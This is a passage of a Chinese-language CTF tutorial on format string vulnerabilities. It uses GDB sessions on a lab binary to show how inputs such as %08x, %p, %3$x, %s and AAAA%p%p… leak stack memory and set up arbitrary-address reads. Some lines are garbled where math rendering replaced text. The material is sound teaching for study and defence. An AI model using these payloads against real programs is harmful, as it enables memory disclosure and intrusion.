<p>可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用GDB来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。</p>
<p>首先，启动程序，将断点下载printf函数处</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br></code></pre></td></tr></table></figure>

<p>之后，运行程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">08x.%08x.%08x</span><br></code></pre></td></tr></table></figure>

<p>此时，程序等待我们的输入，这时我们输入%08x.%08x.%08x，然后敲击回车，是程序继续运行，可以看出程序首先断在了第一次调用printf函数的位置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: 没有那个文件或目录.<br>────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20	 ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04│+0x18: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08│+0x1c: 0x000000c2<br></code></pre></td></tr></table></figure>

<p>可以看出，此时此时已经进入了printf函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的值，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%08x.%08x.%08x<br><br></code></pre></td></tr></table></figure>

<p>可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个printf处</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0xffffcd10 &quot;%08x.%08x.%08x&quot;) at printf.c:28<br>28	in printf.c<br>───────────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;%08x.%08x.%08x&quot;	 ← $eax<br>0xffffcd14│+0x18: &quot;.%08x.%08x&quot;<br>0xffffcd18│+0x1c: &quot;x.%08x&quot;<br></code></pre></td></tr></table></figure>

<p>此时，由于格式化字符串为%x%x%x，所以，程序 会将栈上的0xffffcd04及其之后的数值分别作为第一，第二，第三个参数按照int型进行解析，分别输出。继续运行，我们可以得到如下结果去，确实和想象中的一样。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  c<br>Continuing.<br>ffffcd10.000000c2.f7e8b6bb[Inferior 1 (process 57077) exited normally]<br></code></pre></td></tr></table></figure>

<p>当然，我们也可以使用%p来获取数据，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">%p.%p.%p<br><span class="hljs-number">00000001.22222222</span>.ffffffff.%p.%p.%p<br><span class="hljs-number">0xfff328c0</span><span class="hljs-number">.0</span>xc2<span class="hljs-number">.0</span>xf75c46bb<br></code></pre></td></tr></table></figure>

<p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p>
<p><strong>需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们有没有办法直接获取呢</strong>？肯定是可以的啦。方法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">%n$x<br></code></pre></td></tr></table></figure>

<p>利用如下的字符串，我们就可以获取到对应的第n+1个参数的数值。为什么这里要说是对应第n+1个参数呢？这是因为格式化参数里面的n指的是该格式化字符串对应的第n个输出参数，那相对于输出函数来说，就是第n+1个参数了。</p>
<p>这里我们再次以gdb调试一下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">3<span class="hljs-variable">$x</span></span><br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: 没有那个文件或目录.<br><br>─────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>─────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20	 ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd04│+0x18: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd08│+0x1c: 0x000000c2<br>gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%3$x<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%3$x&quot;) at printf.c:28<br>28	in printf.c<br>─────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>─────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;%3<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.461ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 2351.3 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">x"	 ← </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2190" d="M944 261T944 250T929 230H165Q167 228 182 216T211 189T244 152T277 96T303 25Q308 7 308 0Q308 -11 288 -11Q281 -11 278 -11T272 -7T267 2T263 21Q245 94 195 151T73 236Q58 242 55 247Q55 254 59 257T73 264Q121 283 158 314T215 375T247 434T264 480L267 497Q269 503 270 505T275 509T288 511Q308 511 308 500Q308 493 303 475Q293 438 278 406T246 352T215 315T185 287T165 270H929Q944 261 944 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-78" x="0" y="0"/>
<g transform="translate(850,0)">
 <use xlink:href="#E1-MJMAIN-22"/>
 <use xlink:href="#E1-MJMAIN-2190" x="500" y="0"/>
</g>
</g>
</svg>eax<br>0xffffcd14│+0x18: 0xffffce00  →  0x00000001<br>0xffffcd18│+0x1c: 0x000000e0<br>gef➤  c<br>Continuing.<br>f7e8b6bb[Inferior 1 (process 57442) exited normally]<br></code></pre></td></tr></table></figure>

<p>可以看出，我们确实获得了printf的第4个参数所对应的值f7e8b6bb。</p>
<h4 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h4><p>此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到%s了。这里还是使用上面的程序，进行gdb调试，如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">s</span><br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: 没有那个文件或目录.<br>────────────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20	 ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x18: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x1c: 0x000000c2<br>gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%s<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28	in printf.c<br>──────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: 0xff007325 (&quot;%s&quot;?)	 ← $eax<br>0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18│+0x1c: 0x000000e0<br>gef➤  c<br>Continuing.<br><span class="hljs-meta">%</span><span class="bash">s[Inferior 1 (process 57488) exited normally]</span><br></code></pre></td></tr></table></figure>

<p>可以看出，在第二次执行printf函数的时候，确实是将0xffffcd04处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p>
<p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p>
<p>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第printf的第3个参数，如下，此时程序就不能够解析，就崩溃了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">2<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%2$s<br>[1]    57534 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure>

<p><strong>小技巧总结</strong></p>
<blockquote>
<ol>
<li>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。</li>
<li>利用%s来获取变量所对应地址的内容，只不过有零截断。</li>
<li>利用%order\<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="27.33ex" height="3.343ex" style="vertical-align: -1.171ex;" viewbox="0 -934.9 11766.9 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">x来获取指定参数的值，利用%order\</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-78" x="0" y="0"/>
<g transform="translate(572,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">来</text>
</g>
<g transform="translate(1505,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">获</text>
</g>
<g transform="translate(2438,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">取</text>
</g>
<g transform="translate(3371,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">指</text>
</g>
<g transform="translate(4303,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">定</text>
</g>
<g transform="translate(5236,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">参</text>
</g>
<g transform="translate(6169,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">数</text>
</g>
<g transform="translate(7102,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">的</text>
</g>
<g transform="translate(8035,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">值</text>
</g>
<g transform="translate(8968,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">，</text>
</g>
<g transform="translate(9901,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">利</text>
</g>
<g transform="translate(10834,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">用</text>
</g>
</g>
</svg>s来获取指定参数对应地址的内容。</li>
</ol>
</blockquote>
<h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个libc函数的got表内容，从而得到其地址，进而获取libc版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。</p>
<p>我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中s是main函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。我们选择上面的某个函数调用为例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28	in printf.c<br>──────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: 0xff007325 (&quot;%s&quot;?)	 ← $eax<br>0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18│+0x1c: 0x000000e0<br></code></pre></td></tr></table></figure>

<p>可以看出在栈上的第二个变量就是我们的格式化字符串地址0xffffcd10，同时该地址存储的也确实是”%s”格式化字符串内容。</p>
<p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第k个参数。那我们就可以通过如下的方式来获取某个指定地址addr的内容。</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><code class="hljs cos">addr<span class="hljs-built_in">%k</span><span class="hljs-built_in">$s</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址8字节或者16字节。</p>
</blockquote>
<p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[tag]%p%p%p%p%p%p...<br></code></pre></td></tr></table></figure>

<p>一般来说，我们会重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与我们前面的tag重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">AAAA%</span><span class="bash">p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br>00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p<br><span class="hljs-meta">AAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%</span><br></code></pre></td></tr></table></figure>

<p>由0x41414141处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第5个参数，但是是格式化字符串的第4个参数。我们可以来测试一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">4<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%4$s<br>[1]    61439 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure>

<p>可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，，所以程序就崩溃了。具体的可以参考下面的调试。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>───────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0c│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd10│+0x04: 0xffffcd20  →  &quot;%4$s&quot;<br>0xffffcd14│+0x08: 0xffffcd20  →  &quot;%4$s&quot;<br>0xffffcd18│+0x0c: 0x000000c2<br>0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20│+0x14: &quot;%4<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.222ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 2248.3 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">s"	 ← </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2190" d="M944 261T944 250T929 230H165Q167 228 182 216T211 189T244 152T277 96T303 25Q308 7 308 0Q308 -11 288 -11Q281 -11 278 -11T272 -7T267 2T263 21Q245 94 195 151T73 236Q58 242 55 247Q55 254 59 257T73 264Q121 283 158 314T215 375T247 434T264 480L267 497Q269 503 270 505T275 509T288 511Q308 511 308 500Q308 493 303 475Q293 438 278 406T246 352T215 315T185 287T165 270H929Q944 261 944 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-73" x="0" y="0"/>
<g transform="translate(747,0)">
 <use xlink:href="#E1-MJMAIN-22"/>
 <use xlink:href="#E1-MJMAIN-2190" x="500" y="0"/>
</g>
</g>
